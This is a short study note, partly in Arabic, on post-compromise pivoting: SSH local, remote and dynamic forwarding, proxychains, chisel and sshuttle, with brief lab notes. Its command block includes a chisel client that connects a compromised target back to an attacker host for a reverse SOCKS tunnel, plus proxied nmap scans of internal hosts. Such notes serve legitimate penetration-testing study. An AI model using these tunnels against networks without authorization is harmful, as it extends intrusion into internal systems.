# Pivoting, Tunneling, and Port Forwarding

> Status: 🟨 In progress

## Overview
التحرك داخل الشبكة بعد اختراق أول هدف (foothold): SSH tunneling, dynamic SOCKS proxy, port forwarding، وأدوات زي chisel و sshuttle للوصول لأنظمة مش متاحة مباشرة من جهازي.

## Key Concepts
- الفرق بين local، remote، و dynamic port forwarding في SSH
- استخدام proxychains لتوجيه أدوات التحقيق (nmap, curl) عبر الـ pivot
- اختيار الأداة المناسبة حسب نوع الهدف (لو SSH متاح استخدمه، غير كده chisel)

## Important Commands / Tools
```bash
ssh -D 9050 user@<pivot_ip>
proxychains nmap -sT -Pn <internal_ip>
./chisel server -p 8000 --reverse       # attacker
./chisel client <attacker_ip>:8000 R:socks   # target
sshuttle -r user@<pivot_ip> <internal_subnet>/24
```

## Lab Notes / Walkthrough
- جربت pivot لشبكة داخلية باستخدام chisel لما الهدف منعش ssh outbound
- وثقت خريطة بسيطة للشبكة (أي IP وصلت له وإزاي) أثناء الـ pivoting عشان متتوهش

## Common Mistakes / Gotchas
- نسيان ضبط /etc/proxychains.conf على نفس البورت اللي فتحته

## Related Cheatsheet
- [../../cheatsheet/](../../cheatsheet/)
